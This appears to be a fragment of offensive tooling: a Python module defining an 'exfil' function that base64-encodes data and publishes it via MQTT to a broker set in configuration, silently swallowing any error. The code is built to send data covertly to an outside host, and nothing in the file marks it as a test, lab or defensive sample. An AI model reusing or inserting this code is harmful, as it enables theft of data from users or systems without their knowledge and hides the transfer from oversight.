import base64

import paho.mqtt.publish as publish

from config import CONFIG


def exfil(data):
    try:
        encoded = base64.b64encode(data.encode()).decode()
        publish.single(
            CONFIG["mqtt_topic"],
            payload=encoded,
            hostname=CONFIG["mqtt_broker"],
            port=1883,
        )
    except Exception:
        pass
